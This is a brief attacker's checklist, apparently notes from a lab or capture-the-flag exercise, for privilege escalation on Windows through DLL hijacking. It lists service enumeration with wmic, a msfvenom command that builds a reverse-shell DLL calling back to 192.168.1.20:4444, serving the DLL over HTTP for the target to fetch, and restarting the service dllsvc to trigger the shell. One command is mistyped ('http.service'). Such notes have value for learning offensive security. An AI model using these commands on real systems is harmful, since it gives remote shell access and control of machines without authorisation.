(checklist)

- port scan
- version scan
- service scan

COMMANDS:
wmic service get name,pathname,startmode |findstr /i  /v C:\Windows\\

msfvenom -p windows/x64/shell_reverse_tcp lhost=192.168.1.20 lport=4444 -f dll -o hijackme.dll

sudo python3 -m http.service 8000 - let the target download hijackme.dll and put it on /Temp

sc stop dllsvc and sc start dllsvc

go back to listening terminal